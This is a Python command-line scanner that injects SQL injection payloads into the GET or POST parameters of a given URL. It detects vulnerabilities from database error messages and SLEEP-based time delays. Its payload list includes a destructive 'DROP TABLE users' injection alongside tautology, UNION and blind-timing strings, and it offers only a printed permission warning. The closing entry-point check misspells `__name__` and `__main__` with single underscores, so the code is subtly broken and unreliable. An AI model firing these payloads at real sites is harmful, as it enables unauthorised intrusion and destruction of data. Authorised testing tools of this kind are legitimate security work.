#!/usr/bin/env python3
import requests
import re
import sys
import time
from urllib.parse import urlparse, urlencode
import argparse
from datetime import datetime

# SQL error patterns and payloads
SQL_ERRORS = [
    r"mysql_fetch", r"mysql_error", r"SQL syntax.*MySQL", r"Warning.*mysql",
    r"sqlite3", r"unrecognized token", r"ORA-[0-9]{5}", r"PostgreSQL.*ERROR",
    r"Microsoft SQL Server", r"SQLException"
]

SQL_PAYLOADS = [
    "' OR '1'='1", "1; DROP TABLE users --", "' UNION SELECT NULL --",
    "1' AND 1=1 --", "' OR 'a'='a", "1' AND SLEEP(3) --"  # Blind SQL payload
]

# Threshold for time-based blind SQL injection (seconds)
TIME_THRESHOLD = 3

def validate_url(url):
    """Validate URL format."""
    parsed = urlparse(url)
    return all([parsed.scheme in ['http', 'https'], parsed.netloc])

def detect_sql_error(response_text):
    """Check response for SQL error patterns."""
    for pattern in SQL_ERRORS:
        if re.search(pattern, response_text, re.IGNORECASE):
            return True
    return False

def detect_time_delay(start_time, end_time):
    """Check if response time indicates blind SQL injection."""
    return (end_time - start_time) >= TIME_THRESHOLD

def check_sql_injection(url, method="GET", params=None, data=None):
    """Test a URL for SQL injection vulnerabilities."""
    results = []
    session = requests.Session()

    if method.upper() == "GET":
        if not params:
            params = {}
        original_params = params.copy()
    elif method.upper() == "POST":
        if not data:
            data = {}
        original_data = data.copy()
    else:
        print(f"Invalid method: {method}. Skipping.")
        return results

    for payload in SQL_PAYLOADS:
        print(f"\nTesting payload: {payload} on {url}")
        
        if method.upper() == "GET":
            for param in original_params.keys():
                test_params = original_params.copy()
                test_params[param] = payload
                base_url = url.split('?')[0]
                test_url = f"{base_url}?{urlencode(test_params)}"
                try:
                    start_time = time.time()
                    response = session.get(test_url, timeout=10)
                    end_time = time.time()
                    
                    if detect_sql_error(response.text):
                        result = {
                            "method": "GET", "param": param, "payload": payload,
                            "url": test_url, "evidence": "SQL error detected"
                        }
                        results.append(result)
                        print(f" - Vulnerable GET param: {param} | URL: {test_url}")
                    elif "SLEEP" in payload.upper() and detect_time_delay(start_time, end_time):
                        result = {
                            "method": "GET", "param": param, "payload": payload,
                            "url": test_url, "evidence": f"Time delay detected ({end_time - start_time:.2f}s)"
                        }
                        results.append(result)
                        print(f" - Blind SQL vuln (GET): {param} | URL: {test_url}")
                except requests.RequestException as e:
                    print(f" - Error with GET request to {test_url}: {e}")

        elif method.upper() == "POST":
            for param in original_data.keys():
                test_data = original_data.copy()
                test_data[param] = payload
                try:
                    start_time = time.time()
                    response = session.post(url, data=test_data, timeout=10)
                    end_time = time.time()
                    
                    if detect_sql_error(response.text):
                        result = {
                            "method": "POST", "param": param, "payload": payload,
                            "data": test_data, "evidence": "SQL error detected"
                        }
                        results.append(result)
                        print(f" - Vulnerable POST param: {param} | Data: {test_data}")
                    elif "SLEEP" in payload.upper() and detect_time_delay(start_time, end_time):
                        result = {
                            "method": "POST", "param": param, "payload": payload,
                            "data": test_data, "evidence": f"Time delay detected ({end_time - start_time:.2f}s)"
                        }
                        results.append(result)
                        print(f" - Blind SQL vuln (POST): {param} | Data: {test_data}")
                except requests.RequestException as e:
                    print(f" - Error with POST request to {url}: {e}")

    return results

def save_results(results, log_file):
    """Save results to a log file."""
    try:
        with open(log_file, 'a') as f:
            for result in results:
                f.write(f"{result}\n")  # Simplified to plain text for readability
    except IOError as e:
        print(f"Error writing to log file: {e}")

def main():
    print("=== SQL Injection Detection Tool ===")
    print("WARNING: Only test systems you have permission to scan.")

    # Argument parser for command-line input
    parser = argparse.ArgumentParser(description="SQL Injection Detection Tool")
    parser.add_argument("url", help="Target URL (e.g., http://example.com/login.php)")
    parser.add_argument("method", choices=["GET", "POST"], help="HTTP method to test")
    parser.add_argument("-p", "--params", nargs="+", help="Parameters as key=value pairs (e.g., user=test password=pass)", required=True)
    
    args = parser.parse_args()

    # Validate URL
    if not validate_url(args.url):
        print(f"Invalid URL: {args.url}. Use http:// or https:// protocol.")
        sys.exit(1)

    # Parse parameters into a dictionary
    params = {}
    try:
        for param in args.params:
            key, value = param.split("=", 1)
            params[key] = value
    except ValueError:
        print("Invalid parameter format. Use key=value pairs (e.g., user=test).")
        sys.exit(1)

    # Log file setup
    log_file = f"sql_injection_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
    print(f"Results will be logged to: {log_file}")

    # Run the scan
    print(f"\nScanning: {args.url} | Method: {args.method} | Params: {params}")
    results = check_sql_injection(
        args.url,
        args.method,
        params if args.method == "GET" else None,
        params if args.method == "POST" else None
    )

    # Save results
    save_results(results, log_file)

    # Display summary
    print("\n=== Scan Summary ===")
    if results:
        print(f"Found {len(results)} potential vulnerabilities:")
        for result in results:
            print(f"- Method: {result['method']}")
            print(f"  Parameter: {result['param']}")
            print(f"  Payload: {result['payload']}")
            print(f"  Evidence: {result['evidence']}")
            if result['method'] == "GET":
                print(f"  URL: {result['url']}")
            else:
                print(f"  Data: {result['data']}")
            print("---")
    else:
        print("No SQL injection vulnerabilities detected.")
    print(f"Full results logged to: {log_file}")

if _name_ == "_main_":
    main()
